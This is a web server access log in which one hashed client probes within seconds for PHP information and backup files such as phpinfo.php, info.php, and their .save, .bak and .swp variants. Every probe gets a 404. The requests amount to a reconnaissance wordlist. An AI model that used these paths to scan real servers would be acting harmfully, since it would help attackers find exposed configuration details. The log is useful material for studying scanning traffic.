043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:30;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:30;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:30;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:30;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:30;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:30;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:30;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:30;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:30;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:30;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:31;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:32;;/info.php.backup;GET;404
3d26b1ba38a2b067d2d9cdb27e80b45e14a75bdb972c7e2a4a340184077f948f;2025-11-16 22:47:33;;/personen/alumni/schule/5504;GET;200
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:34;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/server.php;GET;404
